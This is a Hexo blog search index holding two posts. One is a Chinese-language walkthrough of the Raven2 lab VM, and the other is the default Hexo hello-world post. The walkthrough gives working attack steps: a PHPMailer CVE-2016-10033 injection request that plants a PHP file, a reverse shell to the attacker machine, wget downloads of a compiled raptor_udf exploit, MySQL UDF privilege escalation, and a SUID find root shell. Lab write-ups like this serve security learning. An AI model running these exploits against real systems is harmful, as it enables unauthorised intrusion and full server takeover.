<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Raven2渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FRaven2%2F</url>
    <content type="text"><![CDATA[Raven2前言 难度中等，主要是想练习一下mysql udf提权，同时靶机也涉及了phpmailer的漏洞 渗透信息收集netdiscover -r 192.168.64.0/24 =&gt; 192.168.64.148 nmap -oN nmap.txt -A 192.168.64.148 123456789101112131415161718192021222324PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)| 2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)| 256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)|_ 256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Raven Security111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 48650/tcp status|_ 100024 1 53215/udp statusMAC Address: 00:0C:29:B2:C8:AD (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel dirb 192.168.64.148 =&gt; /vendor/ /wordpress/ 其中wordpress无法正常打开，vendor存在目录遍历，并发现phpmailer 5.2.16，存在漏洞 GETSHELLmsf：searchsploit phpmailer 选择python那个脚本，修改exp配置： 修改target为靶机的ip，利用文件为/contact.php 修改后门文件路径，默认的用不了 修改反弹shell的ip与端口 这里当然可以手工利用，抓包并向contact.php文件post数据： 1234567891011121314POST /contact.php HTTP/1.1Host: 192.168.64.148Content-Length: 153Accept: text/html, */*; q=0.01Origin: http://192.168.64.148X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://192.168.64.148/contact.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeaction=submit&amp;name=&lt;?php phpinfo();?&gt;&amp;email="anarcoder\" -OQueueDirectory=/tmp -X/var/www/html/test.php server" @protonmail.com&amp;subject=123&amp;message=Pwned 提交或执行后，在kali上成功获取到反弹的shell，再使用python创建一个虚拟终端： python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; udf提权发现存在mysql进程，尝试udf提权： 先在kali中下载exp并编译下来： 1234wget https://www.exploit-db.com/download/1518#下载expmv ./1518 ./1518.c gcc -g -c 1518.cgcc -g -shared -o raptor_udf.so 1518.o -lc 在kali下开启Apache服务：/etc/init.d/apache2 start 将编译器下来的raptor_udf.so移动到/html/，在目标服务器/tmp下执行wget http://192.168.64.131:8080/raptor_udf.so 目标服务器下/usr/lib/mysql/plugin中不具备权限，无法直接将文件直接拷贝到该文件夹中，需要进入数据库中操作，在数据库中导入和导出文件： 12345678910111213141516171819202122232425262728293031323334353637mysql&gt; use mysql;mysql&gt; create table foo(data blob);create table foo(data blob);Query OK, 0 rows affected (0.04 sec)mysql&gt; insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));Query OK, 1 row affected (0.02 sec)mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;Query OK, 1 row affected (0.01 sec)mysql&gt; create function do_system returns string soname &apos;raptor_udf.so&apos;;create function do_system returns string soname &apos;raptor_udf.so&apos;;Query OK, 0 rows affected (0.01 sec)mysql&gt; select * from mysql.func;select * from mysql.func;+-----------+-----+---------------+----------+| name | ret | dl | type |+-----------+-----+---------------+----------+| do_system | 0 | raptor_udf.so | function |+-----------+-----+---------------+----------+1 row in set (0.00 sec)mysql&gt; select do_system(&apos;chmod u+s /usr/bin/find&apos;);select do_system(&apos;chmod u+s /usr/bin/find&apos;);+--------------------------------------+| do_system(&apos;chmod u+s /usr/bin/find&apos;) |+--------------------------------------+| NULL |+--------------------------------------+1 row in set (0.01 sec) 命令执行： 123touch foofind foo -exec 'whoami' \;find foo -exec '/bin/sh' \; 参考文章 Web安全 — CVE-2016-10033漏洞（phpmailer任意代码执行） Raven2渗透实战 MySQL 4.x / 5.0（Linux） - 用户定义函数（UDF）动态库]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F06%2F09%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Sample</tag>
      </tags>
  </entry>
</search>
